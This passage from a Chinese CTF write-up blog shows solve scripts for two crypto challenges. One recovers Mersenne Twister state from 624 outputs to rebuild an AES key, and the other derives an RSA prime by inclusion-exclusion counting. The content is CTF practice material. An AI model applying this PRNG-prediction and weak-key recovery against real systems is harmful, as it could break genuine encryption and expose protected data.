class="number">1252680510</span>, <span class="number">2161330425</span>, <span class="number">1505524757</span>, <span class="number">1106189058</span>, <span class="number">2479195181</span>, <span class="number">4059279758</span>, <span class="number">4087261637</span>, <span class="number">2802856115</span>, <span class="number">215936888</span>, <span class="number">385734300</span>, <span class="number">3976823712</span>, <span class="number">2155716808</span>, <span class="number">166878602</span>, <span class="number">2958581226</span>, <span class="number">2153643018</span>, <span class="number">3459229793</span>, <span class="number">166654981</span>, <span class="number">1135752470</span>, <span class="number">2999716815</span>, <span class="number">102870168</span>, <span class="number">3592405002</span>, <span class="number">143561712</span>, <span class="number">3332529987</span>, <span class="number">3320611547</span>, <span class="number">176304087</span>, <span class="number">3809410875</span>, <span class="number">956905158</span>, <span class="number">3283895217</span>, <span class="number">1267764884</span>, <span class="number">1781613649</span>, <span class="number">2648889013</span>, <span class="number">4023857409</span>, <span class="number">2805378741</span>, <span class="number">2649655508</span>, <span class="number">2608225929</span>, <span class="number">2196639843</span>, <span class="number">2844902511</span>, <span class="number">1947381383</span>, <span class="number">133311662</span>, <span class="number">3189375534</span>, <span class="number">3360781939</span>, <span class="number">2598704112</span>, <span class="number">449730728</span>, <span class="number">1660136746</span>, <span class="number">2120362421</span>, <span class="number">4282918442</span>, <span class="number">553031705</span>, <span class="number">2359175283</span>, <span class="number">1820194402</span>, <span class="number">3326941501</span>, <span class="number">2079373053</span>, <span class="number">3848840564</span>, <span class="number">674418166</span>, <span class="number">2099289575</span>, <span class="number">3503720323</span>, <span class="number">71654499</span>, <span class="number">1153326313</span>, <span class="number">560391397</span>, <span class="number">987219237</span>, <span class="number">3519108661</span>, <span class="number">343772283</span>, <span class="number">2206155982</span>, <span class="number">1710469128</span>, <span class="number">4284016382</span>, <span class="number">1099544658</span>, <span class="number">2385903806</span>, <span class="number">435889661</span>, <span class="number">1754514095</span>, <span class="number">1654595795</span>, <span class="number">2611465271</span>, <span class="number">2924309399</span>, <span class="number">3849122741</span>, <span class="number">2771388572</span>, <span class="number">132443906</span>, <span class="number">639488960</span>, <span class="number">1702455392</span>, <span class="number">1197499823</span>, <span class="number">3431742381</span>, <span class="number">1162507747</span>, <span class="number">1956793904</span>, <span class="number">2882150352</span>, <span class="number">1024607141</span>, <span class="number">573195509</span>, <span class="number">4026654414</span>, <span class="number">2622992078</span>, <span class="number">3350586931</span>, <span class="number">3799382718</span>, <span class="number">189653578</span>, <span class="number">2030853706</span>, <span class="number">2360599919</span>, <span class="number">1447670146</span>, <span class="number">3029293260</span>, <span class="number">449492231</span>, <span class="number">794537698</span>, <span class="number">2013929440</span>, <span class="number">2521582617</span>, <span class="number">3662902133</span>, <span class="number">2988382934</span>, <span class="number">1101429406</span>, <span class="number">2204422539</span>, <span class="number">2884223003</span>, <span class="number">4160719615</span>, <span class="number">378925199</span>, <span class="number">321253023</span>, <span class="number">713869660</span>, <span class="number">1722066591</span>, <span class="number">4190495614</span>, <span class="number">3241838993</span>, <span class="number">3156104799</span>, <span class="number">3976107465</span>, <span class="number">690141471</span>, <span class="number">2565083608</span>, <span class="number">629627271</span>, <span class="number">3367902606</span>, <span class="number">3025623735</span>, <span class="number">1771459709</span>, <span class="number">2325207656</span>, <span class="number">29331249</span>, <span class="number">1631496960</span>, <span class="number">1272596234</span>, <span class="number">677116176</span>, <span class="number">36223230</span>, <span class="number">1894006200</span>, <span class="number">1868323656</span>, <span class="number">147662067</span>, <span class="number">3018282350</span>, <span class="number">847618418</span>, <span class="number">473803624</span>, <span class="number">303813116</span>, <span class="number">1222076488</span>, <span class="number">2857631548</span>, <span class="number">1620440323</span>, <span class="number">3028453586</span>, <span class="number">3771115277</span>, <span class="number">974948581</span>, <span class="number">2805463577</span>, <span class="number">3012869721</span>, <span class="number">1677541868</span>, <span class="number">873746956</span>, <span class="number">3206333732</span>, <span class="number">3540196648</span>, <span class="number">4222297189</span>, <span class="number">3955666095</span>, <span class="number">3723668809</span>, <span class="number">3383181896</span>, <span class="number">1572023031</span>, <span class="number">3593767211</span>, <span class="number">4139994756</span>, <span class="number">2493637240</span>, <span class="number">1055398974</span>, <span class="number">3491895839</span>, <span class="number">2158774748</span>, <span class="number">4074778554</span>, <span class="number">2265454243</span>, <span class="number">3123246270</span>, <span class="number">3737495019</span>, <span class="number">3584208536</span>, <span class="number">505004504</span>, <span class="number">711346815</span>, <span class="number">2265659930</span>, <span class="number">44813444</span>, <span class="number">762261590</span>, <span class="number">2345302575</span>, <span class="number">3635851795</span>, <span class="number">2255282129</span>, <span class="number">3598634106</span>, <span class="number">921749760</span>, <span class="number">1418440684</span>, <span class="number">3784150188</span>, <span class="number">2393915660</span>, <span class="number">2720478000</span>, <span class="number">1612782044</span>, <span class="number">4147046015</span>, <span class="number">2561634247</span>, <span class="number">586916363</span>, <span class="number">1606384598</span>, <span class="number">1299844033</span>, <span class="number">4047608483</span>, <span class="number">3431257347</span>, <span class="number">781242816</span>, <span class="number">3127114595</span>, <span class="number">1484369015</span>, <span class="number">483654543</span>, <span class="number">678493767</span>, <span class="number">2757899632</span>, <span class="number">3276695749</span>, <span class="number">1363370762</span>, <span class="number">1578035875</span>, <span class="number">555054787</span>, <span class="number">3093962781</span>, <span class="number">2222987767</span>, <span class="number">2130200534</span>, <span class="number">2053306276</span>, <span class="number">3948690640</span>, <span class="number">3249023873</span>, <span class="number">2343777324</span>, <span class="number">2833997966</span>, <span class="number">44199340</span>, <span class="number">1950451402</span>, <span class="number">1448991312</span>, <span class="number">1055067146</span>, <span class="number">3980624341</span>, <span class="number">1812874122</span>, <span class="number">2512418377</span>, <span class="number">3541037815</span>, <span class="number">714180005</span>, <span class="number">987816438</span>, <span class="number">3414079245</span>, <span class="number">1619142872</span>, <span class="number">4122595525</span>, <span class="number">3638144912</span>, <span class="number">3337941608</span>, <span class="number">2664929972</span>, <span class="number">1577036940</span>, <span class="number">206102296</span>, <span class="number">2850863132</span>, <span class="number">3729200403</span>, <span class="number">644729416</span>, <span class="number">844182047</span>, <span class="number">2261919397</span>, <span class="number">1040614315</span>, <span class="number">1776485562</span>, <span class="number">677708826</span>, <span class="number">223842114</span>, <span class="number">2591956969</span>, <span class="number">3141458682</span>, <span class="number">4271489476</span>, <span class="number">4253854271</span>, <span class="number">3973860423</span>, <span class="number">2805984925</span>, <span class="number">2908508806</span>, <span class="number">2328769351</span>, <span class="number">3865140</span>, <span class="number">4170270812</span>, <span class="number">1373888554</span>, <span class="number">1702101960</span>, <span class="number">3761095439</span>, <span class="number">3848481069</span>, <span class="number">812779025</span>, <span class="number">2073985983</span>, <span class="number">239315333</span>, <span class="number">1585392927</span>, <span class="number">2233774162</span>, <span class="number">2308108952</span>, <span class="number">3393306946</span>, <span class="number">2891660426</span>, <span class="number">1059096016</span>, <span class="number">2448311649</span>, <span class="number">2662483261</span>, <span class="number">422228248</span>, <span class="number">2356192519</span>, <span class="number">4004741305</span>, <span class="number">432651290</span>, <span class="number">2419877069</span>, <span class="number">3136967672</span>, <span class="number">329338548</span>, <span class="number">510605497</span>, <span class="number">2753410852</span>, <span class="number">2256462380</span>, <span class="number">3602678268</span>, <span class="number">2558451886</span>, <span class="number">324326056</span>, <span class="number">3822050324</span>, <span class="number">944965241</span>, <span class="number">4107093336</span>, <span class="number">1023337388</span>, <span class="number">564298141</span>, <span class="number">2977064774</span>, <span class="number">1802025909</span>, <span class="number">2329346614</span>, <span class="number">1460784428</span>, <span class="number">2510641562</span>, <span class="number">593994802</span>, <span class="number">4034614216</span>, <span class="number">4154528137</span>, <span class="number">3061249939</span>, <span class="number">487067285</span>, <span class="number">2856327155</span>, <span class="number">1909407614</span>, <span class="number">1782934804</span>, <span class="number">947220403</span>, <span class="number">2311402749</span>, <span class="number">3528590202</span>, <span class="number">2841893555</span>, <span class="number">3179384475</span>, <span class="number">3485733076</span>, <span class="number">87074890</span>, <span class="number">753396673</span>, <span class="number">790057962</span>, <span class="number">378850528</span>, <span class="number">3789224576</span>, <span class="number">3983502105</span>, <span class="number">1166116</span>, <span class="number">1854075229</span>, <span class="number">965611444</span>, <span class="number">3399039227</span>, <span class="number">3301304385</span>, <span class="number">3499808775</span>, <span class="number">1553588463</span>, <span class="number">2562124078</span>, <span class="number">3702675704</span>, <span class="number">1456114141</span>, <span class="number">768418804</span>, <span class="number">2227423616</span>, <span class="number">3711148950</span>, <span class="number">2738970313</span>, <span class="number">4033988307</span>, <span class="number">1184409529</span>, <span class="number">3461105405</span>, <span class="number">2986057969</span>, <span class="number">2112332635</span>, <span class="number">615658869</span>, <span class="number">2858394250</span>, <span class="number">2819269426</span>, <span class="number">499315937</span>, <span class="number">1714425168</span>, <span class="number">3816439521</span>, <span class="number">4188657733</span>, <span class="number">1226314395</span>, <span class="number">773286132</span>, <span class="number">1257824142</span>, <span class="number">2439511774</span>, <span class="number">1412431345</span>, <span class="number">451028253</span>, <span class="number">102711904</span>, <span class="number">3272107935</span>, <span class="number">1915128127</span>, <span class="number">674941443</span>, <span class="number">1907183006</span>, <span class="number">4205826365</span>, <span class="number">2592631544</span>, <span class="number">2001660887</span>, <span class="number">1793337902</span>, <span class="number">336832953</span>, <span class="number">1676534641</span>, <span class="number">439197643</span>, <span class="number">2175306211</span>, <span class="number">1969440247</span>, <span class="number">4084563735</span>, <span class="number">564896680</span>, <span class="number">1293717918</span>, <span class="number">1136684128</span>, <span class="number">4289259757</span>, <span class="number">2368216261</span>, <span class="number">3167549822</span>, <span class="number">1998645278</span>, <span class="number">2908859410</span>, <span class="number">2014400533</span>, <span class="number">1482521794</span>, <span class="number">3082876093</span>, <span class="number">2742987778</span>, <span class="number">3273667028</span>, <span class="number">1654313273</span>, <span class="number">3551772744</span>, <span class="number">1923315597</span>, <span class="number">1063687791</span>, <span class="number">1907747434</span>, <span class="number">3323400678</span>, <span class="number">3445870975</span>, <span class="number">316314436</span>, <span class="number">3905619499</span>, <span class="number">853586576</span>, <span class="number">456263058</span>, <span class="number">3213830894</span>, <span class="number">3603099146</span>, <span class="number">1478599807</span>, <span class="number">344267130</span>, <span class="number">1085971878</span>, <span class="number">2416474796</span>, <span class="number">247701271</span>, <span class="number">2926294528</span>, <span class="number">1981779524</span>, <span class="number">3809025846</span>, <span class="number">2106937971</span>, <span class="number">1596271124</span>, <span class="number">1289668306</span>, <span class="number">1824884242</span>, <span class="number">543613169</span>, <span class="number">2698011204</span>, <span class="number">1632632104</span>, <span class="number">179981234</span>, <span class="number">1091171130</span>, <span class="number">608067622</span>, <span class="number">4034608897</span>, <span class="number">2707671187</span>, <span class="number">2261524231</span>, <span class="number">2177175178</span>, <span class="number">1649366013</span>, <span class="number">733151281</span>, <span class="number">2783115482</span>, <span class="number">389580085</span>, <span class="number">495962438</span>, <span class="number">512715565</span>, <span class="number">1917819840</span>, <span class="number">1993385884</span>, <span class="number">2910358830</span>, <span class="number">3223741704</span>, <span class="number">3302008571</span>, <span class="number">857474180</span>, <span class="number">143995596</span>, <span class="number">3194737469</span>, <span class="number">2792999636</span>, <span class="number">111369357</span>, <span class="number">2665449999</span>, <span class="number">3481184513</span>, <span class="number">21965724</span>, <span class="number">172308864</span>, <span class="number">3373225896</span>, <span class="number">3941204120</span>, <span class="number">1487487599</span>, <span class="number">2697473345</span>, <span class="number">4173199839</span>, <span class="number">1988623177</span>, <span class="number">3567610975</span>, <span class="number">2393053467</span>, <span class="number">2231132558</span>, <span class="number">3798877543</span>, <span class="number">4275987399</span>, <span class="number">3626515970</span>, <span class="number">3957758644</span>, <span class="number">3196139612</span>, <span class="number">1577858639</span>, <span class="number">4145376193</span>, <span class="number">3982712357</span>, <span class="number">1316354617</span>, <span class="number">2476570111</span>, <span class="number">2796635786</span>, <span class="number">3673095113</span>, <span class="number">317782376</span>, <span class="number">38302891</span>, <span class="number">2729549772</span>, <span class="number">3124741082</span>, <span class="number">779634809</span>, <span class="number">480059945</span>, <span class="number">1764557943</span>, <span class="number">1905762442</span>, <span class="number">2439926326</span>, <span class="number">3398546304</span>, <span class="number">1275206055</span>, <span class="number">3578388510</span>, <span class="number">4286589961</span>, <span class="number">2284154687</span>, <span class="number">1547652572</span>, <span class="number">211218778</span>, <span class="number">4019993609</span>, <span class="number">1035325551</span>, <span class="number">47385212</span>, <span class="number">1413260320</span>, <span class="number">1895132671</span>, <span class="number">2144191841</span>, <span class="number">976730195</span>, <span class="number">880818479</span>, <span class="number">2944522030</span>, <span class="number">3051883625</span>, <span class="number">941172532</span>, <span class="number">1956827360</span>, <span class="number">604038865</span>, <span class="number">1490554868</span>, <span class="number">2014326554</span>, <span class="number">3585424155</span>, <span class="number">1705580179</span>, <span class="number">1484996770</span>, <span class="number">3145161387</span>, <span class="number">2410763156</span>, <span class="number">1196196268</span>, <span class="number">4125882510</span>, <span class="number">1569631240</span>, <span class="number">3635487118</span>, <span class="number">3743075539</span>, <span class="number">53348120</span>, <span class="number">3549050110</span>, <span class="number">2179975673</span>, <span class="number">1455493727</span>, <span class="number">909517499</span>, <span class="number">2034744814</span>, <span class="number">1815931219</span>, <span class="number">2625466993</span>, <span class="number">2328144852</span>, <span class="number">3083176966</span>, <span class="number">4185591290</span>, <span class="number">4232725936</span>, <span class="number">233807337</span>, <span class="number">987553443</span>, <span class="number">25498384</span>, <span class="number">1577858645</span>, <span class="number">3349985471</span>, <span class="number">222166290</span>, <span class="number">1566719496</span>, <span class="number">4025597331</span>, <span class="number">454410574</span>, <span class="number">4172717618</span>, <span class="number">3397690720</span>, <span class="number">1563985388</span>, <span class="number">1294197484</span>, <span class="number">454917824</span>, <span class="number">250364909</span>, <span class="number">1076318659</span>, <span class="number">3751354075</span>, <span class="number">3324840413</span>, <span class="number">2834288682</span>, <span class="number">1309780963</span>, <span class="number">3789459740</span>, <span class="number">1605544538</span>, <span class="number">1448439145</span>, <span class="number">1158482892</span>, <span class="number">407656226</span>, <span class="number">3589982226</span>, <span class="number">2670402128</span>, <span class="number">2795218845</span>, <span class="number">4079499284</span>, <span class="number">2736737218</span>, <span class="number">468906864</span>, <span class="number">347349067</span>, <span class="number">3541605667</span>, <span class="number">1532233501</span>, <span class="number">1192558327</span>, <span class="number">3650037602</span>, <span class="number">1570092544</span>, <span class="number">3596826230</span>, <span class="number">2768927258</span>, <span class="number">1775543901</span>, <span class="number">1324819997</span>, <span class="number">3401066173</span>, <span class="number">4078892370</span>, <span class="number">3373389918</span>, <span class="number">3360817112</span>, <span class="number">3261261117</span>, <span class="number">2443241006</span>, <span class="number">847292772</span>, <span class="number">3862028592</span>, <span class="number">4086319712</span>, <span class="number">1837673494</span>, <span class="number">3577160747</span>, <span class="number">2636413549</span>, <span class="number">4021668342</span>, <span class="number">573747407</span>, <span class="number">3546255858</span>, <span class="number">2787607684</span>, <span class="number">403421850</span>, <span class="number">3477281082</span>, <span class="number">4133820736</span>, <span class="number">332805644</span>, <span class="number">3663845239</span>, <span class="number">80993494</span>, <span class="number">344033777</span>, <span class="number">1187319040</span>, <span class="number">1547969768</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    predictor.setrandbits(data[i], <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    predictor.backtrack_getrandbits(<span class="number">32</span>)    </span><br><span class="line"></span><br><span class="line">m = predictor.backtrack_getrandbits(<span class="number">16</span> * <span class="number">8</span>)</span><br><span class="line">key = m.to_bytes(<span class="number">16</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">cipher = AES.new(key,AES.MODE_ECB)</span><br><span class="line">c =  <span class="string">b&#x27;a\\x93\\xdc\\xc3\\x90\\x0cK\\xfa\\xfb\\x1c\\x05$y\\x16:\\xfc\\xf3+\\xf8+%\\xfe\\xf9\\x86\\xa3\\x17i+ab\\xca\\xb6\\xcd\\r\\xa5\\x94\\xeaVM\\xdeo\\xa7\\xdf\\xa9D\\n\\x02\\xa3&#x27;</span></span><br><span class="line">flag = cipher.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="fl-g"><a href="#fl-g" class="headerlink" title="fl@g"></a>fl@g</h3><p>学习下概率论里的包含排斥原理</p>
<p><code>table</code>的长度是66，算出<code>flag&quot; &quot;FLAG&quot; &quot;f14G&quot;  &quot;7!@9</code>排列的情况 <code>x=factorial(63)*4-factorial(60)*4+factorial(57)</code>之后很简单<code>rsa</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits + <span class="string">&quot;@?!*&quot;</span></span><br><span class="line">n = <span class="number">10179374723747373757354331803486491859701644330006662145185130847839571647703918266478112837755004588085165750997749893646933873398734236153637724985137304539453062753420396973717</span></span><br><span class="line">c = <span class="number">1388132475577742501308652898326761622837921103707698682051295277382930035244575886211234081534946870195081797116999020335515058810721612290772127889245497723680133813796299680596</span></span><br><span class="line"></span><br><span class="line">x=factorial(<span class="number">63</span>)*<span class="number">4</span>-factorial(<span class="number">60</span>)*<span class="number">4</span>+factorial(<span class="number">57</span>)</span><br><span class="line">p=nextprime(x)</span><br><span class="line">q=n//p</span><br><span class="line">d=inverse(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>viol1t</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://viol1t.com/2024/07/17/2024%E5%B9%B4WKCTF-wp/">https://viol1t.com/2024/07/17/2024%E5%B9%B4WKCTF-wp/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2023 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/WP/"># WP</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2024/05/30/2024%E5%B9%B4CISCN%E5%88%9D%E8%B5%9Bwp/">2024年CISCN初赛wp</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© viol1t | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>